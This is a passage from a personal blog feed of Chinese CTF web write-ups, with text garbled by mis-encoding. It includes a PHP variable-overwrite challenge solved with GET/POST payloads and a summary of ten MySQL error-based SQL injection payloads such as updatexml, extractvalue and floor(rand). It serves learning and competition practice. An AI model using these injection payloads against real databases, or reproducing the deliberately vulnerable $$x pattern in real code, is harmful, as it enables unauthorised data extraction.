class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ”¯æŒgetå’Œpostä¼ å‚çš„æ•°ç»„éå†</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">exit</span>($handsome);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">Â  Â  <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>Â  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">Â  Â  <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿˜åŠ äº†ä¸‰å±‚è¿‡æ»¤è§„åˆ™</span></span><br><span class="line"><span class="comment">//1.ä¸ç®¡æ˜¯getè¿˜æ˜¯post,flagéƒ½ä¸èƒ½ç­‰äºflag,å¦åˆ™é€€å‡º</span></span><br><span class="line"><span class="comment">//2.æ£€æµ‹getæˆ–postæ˜¯å¦æœ‰flag,æ²¡æœ‰åˆ™é€€å‡º</span></span><br><span class="line"><span class="comment">//3.å¦‚æœgetçš„flagä¸ç­‰äºflag,é€€å‡º</span></span><br><span class="line"><span class="comment">//ä¹Ÿå°±æ˜¯è¦æ±‚getçš„flag=flag,ä½†ä¸èƒ½postæˆ–è€…getçš„flag=flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure></p><p>çœ‹ä¸€ä¸‹foreachå‡½æ•°,åœ¨ä¸æ”¹å˜flagçš„æƒ…å†µä¸‹exit()ä¹Ÿèƒ½ä½œä¸ºè¾“å‡º,æœ¬é¢˜çš„æ€è·¯å°±æ˜¯å˜é‡è¦†ç›–<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚foreach ä»…èƒ½å¤Ÿåº”ç”¨äºæ•°ç»„å’Œå¯¹è±¡ï¼Œå¦‚æœå°è¯•åº”ç”¨äºå…¶ä»–æ•°æ®ç±»å‹çš„å˜é‡ï¼Œæˆ–è€…æœªåˆå§‹åŒ–çš„å˜é‡å°†å‘å‡ºé”™è¯¯ä¿¡æ¯ã€‚æœ‰ä¸¤ç§è¯­æ³•ï¼š</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">Â  Â  statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">Â  Â  statement</span><br><span class="line">ç¬¬ä¸€ç§æ ¼å¼éå†ç»™å®šçš„ array_expression æ•°ç»„ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ $value å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªå•å…ƒï¼‰ã€‚</span><br><span class="line">ç¬¬äºŒç§æ ¼å¼åšåŒæ ·çš„äº‹ï¼Œåªé™¤äº†å½“å‰å•å…ƒçš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ $keyã€‚</span><br></pre></td></tr></table></figure></p><h3 id="æ–¹æ³•ä¸€-GET"><a href="#æ–¹æ³•ä¸€-GET" class="headerlink" title="æ–¹æ³•ä¸€:GET"></a>æ–¹æ³•ä¸€:GET</h3><p>geté‡Œåªè¦èƒ½æ„æˆå˜é‡è¦†ç›–,ç”¨$ydsæˆ–$iséƒ½è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">Â  Â  $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯yds=flag<br>$x=yds,$y=flag,æ‰€ä»¥$$x=$yds,$$y=$flag</p><p>$$x = $$y,ä¹Ÿå°±æ˜¯$yds=$flag</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yds=flag</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯is=flag<br>$x=is,$y=flag,æ‰€ä»¥$$x=$is,$$y=$flag</p><p>$$x = $$y,ä¹Ÿå°±æ˜¯$is=$flag</p><p>åˆå› ä¸ºè¦æ±‚flag=flag,æ‰€ä»¥$x=flag,$y=flag,å¸¦è¿›å»å˜æˆ$flag=$flag</p><p>å°†ä¸¤ç§æƒ…å†µè¿æ¥èµ·æ¥</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./28.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{64be7429-88b0-4318-8e17-3a7efb7a540a}</p><h3 id="æ–¹æ³•äºŒ-GET-POST"><a href="#æ–¹æ³•äºŒ-GET-POST" class="headerlink" title="æ–¹æ³•äºŒ:GET+POST"></a>æ–¹æ³•äºŒ:GET+POST</h3><p>åœ¨posté‡Œä¹Ÿå¯ä»¥è¿›è¡Œä¸€æ¬¡å˜é‡è¦†ç›–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">$$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦postä¸€ä¸ªç­‰å¼ä½¿å¾—æ‰§è¡Œåä¸º$$flag=$flag,å³$flag=flag<br>ç„¶ågetä¼ å‚ä¸ºyds=flag,è¯¦ç»†çœ‹æ–¹æ³•ä¸€</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">yds=flag</span><br><span class="line">POST:</span><br><span class="line">$flag=flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GYCTF2020-Blacklist&quot;&gt;&lt;a href=&quot;#GYCTF2020-Blacklist&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]Blacklist&quot;&gt;&lt;/a&gt;[GYCTF2020]Blacklist&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF webç»ƒä¹ 4</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A04/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A04/</id>
    <published>2020-10-05T09:50:50.000Z</published>
    <updated>2020-10-05T09:58:42.403Z</updated>
    
    <content type="html"><![CDATA[<p>webé¢˜è‡ªç„¶æ˜¯æƒ³mdå½¢å¼,çœ‹ç€å¥½çœ‹,å¥ˆä½•æœ¬åœ°æŠ¥é”™,pdfå‡‘åˆçœ‹å§</p><p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="BUUCTF_webç»ƒä¹ 4.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;webé¢˜è‡ªç„¶æ˜¯æƒ³mdå½¢å¼,çœ‹ç€å¥½çœ‹,å¥ˆä½•æœ¬åœ°æŠ¥é”™,pdfå‡‘åˆçœ‹å§&lt;/p&gt;
&lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;BUUCTF_webç»ƒä¹ 4.pdf&quot; width=&quot;100%&quot; height
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>SQLæŠ¥é”™æ³¨å…¥å°ç»“</title>
    <link href="https://www.damyahome.github.io/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</id>
    <published>2020-10-02T07:48:06.000Z</published>
    <updated>2020-10-02T07:55:20.735Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰é˜µå­çœ‹æˆ‘ä»¥å‰çš„æ–‡ç« </p><p><a href="http://www.damyahome.top/%E4%B8%80%E4%BA%9B%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9A%84web%E9%A2%98wp/" target="_blank" rel="noopener">http://www.damyahome.top/%E4%B8%80%E4%BA%9B%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9A%84web%E9%A2%98wp/</a></p><p>æœ‰å†™æœ‰åç§æŠ¥é”™æ³¨å…¥çš„æ–¹å¼,ç„¶åè§‰å¾—è‡ªå·±è¿˜æ²¡ç†è§£é€,æ‰€ä»¥å°ç»“æ¢³ç†ä¸€ä¸‹.</p><p>åªåˆ†æå¸¸ç”¨çš„ä¸‰ç§,å…¶ä»–éƒ½å¯ä»¥ä¸¾ä¸€åä¸‰.</p><h2 id="åç§æŠ¥é”™æ³¨å…¥"><a href="#åç§æŠ¥é”™æ³¨å…¥" class="headerlink" title="åç§æŠ¥é”™æ³¨å…¥"></a>åç§æŠ¥é”™æ³¨å…¥</h2><p>èµ„æ–™æ¥è‡ª:</p><p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p><ol><li><p>floor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></li><li><p>updatexml()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></li><li><p>geometrycollection()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>multipoint()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>polygon()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>multipolygon()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>linestring()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>multilinestring()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>exp()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure></li></ol><p>å…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯floor(),extractvalue(),updataxml().exp()ä¹Ÿé‡åˆ°è¿‡.</p><h2 id="flooræŠ¥é”™"><a href="#flooræŠ¥é”™" class="headerlink" title="flooræŠ¥é”™"></a>flooræŠ¥é”™</h2><p>åŸå› ä¸»è¦æ˜¯å› ä¸ºè™šæ‹Ÿè¡¨çš„ä¸»é”®é‡å¤ã€‚æŒ‰ç…§MySQLçš„å®˜æ–¹è¯´æ³•ï¼Œgroup byè¦è¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ‹¿group byåé¢çš„å­—æ®µå€¼åˆ°è™šæ‹Ÿè¡¨ä¸­å»å¯¹æ¯”å‰ï¼Œé¦–å…ˆè·å–group byåé¢çš„å€¼ï¼›ç¬¬äºŒæ¬¡æ˜¯å‡è®¾group byåé¢çš„å­—æ®µçš„å€¼åœ¨è™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œé‚£å°±éœ€è¦æŠŠå®ƒæ’å…¥åˆ°è™šæ‹Ÿè¡¨ä¸­ï¼Œè¿™é‡Œåœ¨æ’å…¥æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡è¿ç®—ï¼Œç”±äºrandå‡½æ•°å­˜åœ¨ä¸€å®šçš„éšæœºæ€§ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è¿ç®—çš„ç»“æœå¯èƒ½ä¸ç¬¬ä¸€æ¬¡è¿ç®—çš„ç»“æœä¸ä¸€è‡´ï¼Œä½†æ˜¯è¿™ä¸ªè¿ç®—çš„ç»“æœå¯èƒ½åœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨äº†ï¼Œé‚£ä¹ˆè¿™æ—¶çš„æ’å…¥å¿…ç„¶å¯¼è‡´ä¸»é”®çš„é‡å¤ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ï¼Œçˆ†å‡ºæˆ‘ä»¬å®é™…æƒ³æŸ¥è¯¢çš„æ•°æ®ã€‚</p><h3 id="å‡½æ•°åŸç†"><a href="#å‡½æ•°åŸç†" class="headerlink" title="å‡½æ•°åŸç†"></a>å‡½æ•°åŸç†</h3><p>åŸºæœ¬è¯­å¥(x è¡¨ç¤ºæ•°å­—)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(floor(rand(0)*2))x from table group by x;</span><br></pre></td></tr></table></figure><p>ä¸¾ä¾‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floorå‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›å°äºç­‰äºè¯¥å€¼çš„æœ€å¤§æ•´æ•°,ä¹Ÿå¯ä»¥ç†è§£ä¸ºå‘ä¸‹å–æ•´,åªä¿ç•™æ•´æ•°éƒ¨åˆ†.</p><h4 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h4><p>rand()å’Œrand(0)æ˜¯æœ‰åŒºåˆ«çš„,randç”Ÿæˆéšæœºçš„0-1é—´éšæœºæ•°,ç»“æœä¸ç¡®å®š,è€ŒåŠ äº†0çš„ç§å­,å°±ä¼šå½¢æˆä¼ªéšæœº.(äº§ç”Ÿçš„æ•°æ®éƒ½æ˜¯å¯é¢„çŸ¥çš„)å½“ç”Ÿæˆçš„æ•°æ®å’Œè™šæ‹Ÿè¡¨æ•°æ®é‡åˆæ—¶,å°±ä¼šå½¢æˆæŠ¥é”™.</p><h4 id="floor-rand-0-2"><a href="#floor-rand-0-2" class="headerlink" title="floor(rand(0)*2)"></a>floor(rand(0)*2)</h4><p>å°†0-1é—´éšæœºæ•°å˜æˆ0-2é—´çš„éšæœºæ•°,å¹¶è¿›è¡Œå–æ•´,å¾—åˆ°01éšæœºæ•°ä¸².</p><h4 id="group-by-ä¸-count"><a href="#group-by-ä¸-count" class="headerlink" title="group by ä¸ count(*)"></a>group by ä¸ count(*)</h4><p>group by()å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„,ç›¸åŒçš„åˆ†ä¸ºä¸€ç»„,æ•´åˆé‡å¤æ•°æ®.</p><p>count()å¯¹é‡å¤æ•°æ®è¿›è¡Œè®¡æ•°.åœ¨æŸ¥è¯¢æ•°æ®çš„æ—¶å€™,é¦–å…ˆæŸ¥çœ‹è¯¥è™šæ‹Ÿè¡¨ä¸­æ˜¯å¦å­˜åœ¨è¯¥åˆ†ç»„,å¦‚æœå­˜åœ¨é‚£ä¹ˆè®¡æ•°å€¼åŠ 1,ä¸å­˜åœ¨åˆ™æ–°å»ºè¯¥åˆ†ç»„.</p><figure class="image-box">                <img src="./1.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>count(*) å°†è¿”å›è¡¨æ ¼ä¸­æ‰€æœ‰å­˜åœ¨çš„è¡Œçš„æ€»æ•°åŒ…æ‹¬å€¼ä¸º null çš„è¡Œ,åœ¨mysqlæŸ¥è¯¢ä¸­æ˜¯æœ€å¿«çš„æ–¹å¼.</p><h3 id="æŠ¥é”™åˆ†æ"><a href="#æŠ¥é”™åˆ†æ" class="headerlink" title="æŠ¥é”™åˆ†æ"></a>æŠ¥é”™åˆ†æ</h3><h4 id="group-by-çš„è™šæ‹Ÿè¡¨"><a href="#group-by-çš„è™šæ‹Ÿè¡¨" class="headerlink" title="group by()çš„è™šæ‹Ÿè¡¨"></a>group by()çš„è™šæ‹Ÿè¡¨</h4><p>åœ¨å¯¹æ•°æ®è¿›è¡ŒæŸ¥è¯¢æ—¶,group byä¼šæŠŠé‡å¤æ•°æ®æ•´åˆ,ç”Ÿæˆè™šæ‹Ÿè¡¨,æˆ‘ä»¬çš„æŸ¥è¯¢ä¹Ÿæ˜¯åœ¨è™šæ‹Ÿè¡¨ä¸Šè¿›è¡ŒæŸ¥è¯¢,é¿å…äº†é‡å¤æ•°æ®çš„å¹²æ‰°,å¹¶ä¸”éœ€è¦æ•´åˆå‡½æ•°count()æˆ–sum()è¿›è¡Œè®¡æ•°.</p><figure class="image-box">                <img src="./2.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><h4 id="rand-çš„ç‰¹æ®Šæ€§"><a href="#rand-çš„ç‰¹æ®Šæ€§" class="headerlink" title="rand()çš„ç‰¹æ®Šæ€§"></a>rand()çš„ç‰¹æ®Šæ€§</h4><p>æ ¹æ®group byçš„ä¸¤æ¬¡è¿ç®—,å½“å…¶è¿›è¡Œåˆ†ç»„æ—¶,è°ƒç”¨çš„floor(rand(0)<em>2)æ‰§è¡Œä¸€æ¬¡(æŸ¥çœ‹åˆ†ç»„æ˜¯å¦å­˜åœ¨),å¦‚æœè™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨è¯¥åˆ†ç»„,é‚£ä¹ˆåœ¨æ’å…¥æ–°åˆ†ç»„çš„æ—¶å€™ floor(rand(0)</em>2) å°±åˆè®¡ç®—äº†ä¸€æ¬¡.(åªè¦ rand(0) è¢«è°ƒç”¨ï¼Œä¸€å®šä¼šäº§ç”Ÿæ–°å€¼)</p><p>æ ¹æ®ä¹‹å‰ç”Ÿæˆçš„è¡¨è¿›è¡Œåˆ†æ.</p><figure class="image-box">                <img src="./3.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å½“ group by å¯¹å…¶è¿›è¡Œåˆ†ç»„çš„æ—¶å€™,é¦–å…ˆé‡åˆ°ç¬¬ä¸€ä¸ªå€¼ 0 ,å‘ç° 0 ä¸å­˜åœ¨,äºæ˜¯éœ€è¦æ’å…¥åˆ†ç»„,æ­¤æ—¶floor(rand(0)<em>2)å†æ¬¡è¢«è§¦å‘,ç”Ÿæˆç¬¬äºŒä¸ªå€¼1,å› æ­¤æœ€ç»ˆæ’å…¥è™šæ‹Ÿè¡¨çš„ä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªå€¼ 1;ç„¶åé‡åˆ°ç¬¬ä¸‰ä¸ªå€¼ 1 ,å› ä¸ºå·²ç»å­˜åœ¨åˆ†ç»„ 1 äº†,å°±ç›´æ¥è®¡æ•°åŠ 1(count()è¿™æ—¶1çš„è®¡æ•°å˜ä¸º2);é‡åˆ°ç¬¬å››ä¸ªå€¼ 0 çš„æ—¶å€™,å‘ç° 0 ä¸å­˜åœ¨,äºæ˜¯åˆéœ€è¦æ’å…¥æ–°åˆ†ç»„,ç„¶åfloor(rand(0)</em>2)åˆè¢«è§¦å‘,ç”Ÿæˆç¬¬äº”ä¸ªå€¼ 1 ,å› æ­¤è¿™æ—¶è¿˜æ˜¯å¾€è™šæ‹Ÿè¡¨é‡Œæ’å…¥åˆ†ç»„ 1 ,ä½†åˆ†ç»„ 1 å·²ç»å­˜åœ¨,æ‰€ä»¥æŠ¥é”™.</p><h2 id="extractvalueæŠ¥é”™"><a href="#extractvalueæŠ¥é”™" class="headerlink" title="extractvalueæŠ¥é”™"></a>extractvalueæŠ¥é”™</h2><p>MySQL 5.1.5ç‰ˆæœ¬ä¸­æ·»åŠ äº†å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ä¸¤ä¸ªå‡½æ•°ï¼šextractvalueã€updatexml</p><p>extractvalue()ä½¿ç”¨XPathè¡¨ç¤ºæ³•ä»XMLå­—ç¬¦ä¸²ä¸­æå–å€¼</p><h3 id="å‡½æ•°åŸç†-1"><a href="#å‡½æ•°åŸç†-1" class="headerlink" title="å‡½æ•°åŸç†"></a>å‡½æ•°åŸç†</h3><p>åŸºæœ¬è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure><p>ä¸¾ä¾‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>ExtractValue(xml_frag, xpath_expr)</p><p>ExtractValue()æ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œä¸€ä¸ªXMLæ ‡è®°ç‰‡æ®µ xml_fragå’Œä¸€ä¸ªXPathè¡¨è¾¾å¼ xpath_exprï¼ˆä¹Ÿç§°ä¸º å®šä½å™¨ï¼‰; å®ƒè¿”å›CDATAç¬¬ä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹çš„textï¼ˆï¼‰ï¼Œè¯¥èŠ‚ç‚¹æ˜¯XPathè¡¨è¾¾å¼åŒ¹é…çš„å…ƒç´ çš„å­å…ƒç´ ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨Xpathè·¯å¾„æ³•è¡¨ç¤ºçš„æŸ¥æ‰¾è·¯å¾„</p><h4 id="XPathè·¯å¾„è¡¨è¾¾å¼"><a href="#XPathè·¯å¾„è¡¨è¾¾å¼" class="headerlink" title="XPathè·¯å¾„è¡¨è¾¾å¼"></a>XPathè·¯å¾„è¡¨è¾¾å¼</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nodenameã€€ã€€èŠ‚ç‚¹åï¼Œé€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹ã€€ã€€ä¾‹ï¼š childnodeã€€ã€€å½“å‰èŠ‚ç‚¹ä¸­çš„childnodeå­èŠ‚ç‚¹ï¼Œä¸åŒ…å«å­™å­åŠä»¥ä¸‹çš„èŠ‚ç‚¹</span><br><span class="line">/ã€€ã€€ã€€ä»æ ¹èŠ‚ç‚¹é€‰å–ã€€ã€€ä¾‹ï¼š/root/childnode/grandsonnode</span><br><span class="line">//ã€€Â  è¡¨ç¤ºæ‰€æœ‰åä»£èŠ‚ç‚¹ã€€ã€€ä¾‹ï¼š//childnodeã€€æ‰€æœ‰åä¸ºchildnodeçš„åä»£èŠ‚ç‚¹</span><br><span class="line">.ã€€ã€€ è¡¨ç¤ºå½“å‰èŠ‚ç‚¹ã€€ã€€ä¾‹ï¼š./childnodeã€€    è¡¨ç¤ºå½“å‰èŠ‚ç‚¹çš„childnodeèŠ‚ç‚¹</span><br><span class="line">..ã€€  è¡¨ç¤ºçˆ¶èŠ‚ç‚¹ã€€ã€€ä¾‹ï¼š ../nearnodeã€€ã€€  è¡¨ç¤ºçˆ¶äº²èŠ‚ç‚¹çš„nearnodeå­èŠ‚ç‚¹</span><br><span class="line">@ã€€ã€€ é€‰å–å±æ€§ã€€ã€€/root/childnode/@idã€€ã€€è¡¨ç¤ºchildnodeçš„æ‰€æœ‰å«æœ‰idå±æ€§çš„èŠ‚ç‚¹é›†</span><br></pre></td></tr></table></figure><p>è°“è¯­å¯ä»¥å¯¹èŠ‚ç‚¹é›†è¿›è¡Œä¸€äº›é™åˆ¶ï¼Œä½¿é€‰æ‹©æ›´ç²¾ç¡®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/root/book[1]ã€€ã€€ã€€ã€€èŠ‚ç‚¹é›†ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span><br><span class="line">/root/book[last()]ã€€ã€€èŠ‚ç‚¹é›†ä¸­æœ€åä¸€ä¸ªèŠ‚ç‚¹</span><br><span class="line">/root/book[position() - 1]ã€€ã€€èŠ‚ç‚¹é›†ä¸­å€’æ•°ç¬¬äºŒä¸ªèŠ‚ç‚¹é›†</span><br><span class="line">/root/book[position() &lt; 5]ã€€ã€€èŠ‚ç‚¹é›†ä¸­å‰äº”ä¸ªèŠ‚ç‚¹é›†</span><br><span class="line">/root/book[@id]ã€€ã€€ã€€ã€€ã€€ã€€èŠ‚ç‚¹é›†ä¸­å«æœ‰å±æ€§idçš„èŠ‚ç‚¹é›†</span><br><span class="line">/root/book[@id=&apos;chinese&apos;]ã€€ã€€èŠ‚ç‚¹é›†ä¸­idå±æ€§å€¼ä¸ºchineseçš„èŠ‚ç‚¹é›†</span><br><span class="line">/root/book[price &gt; 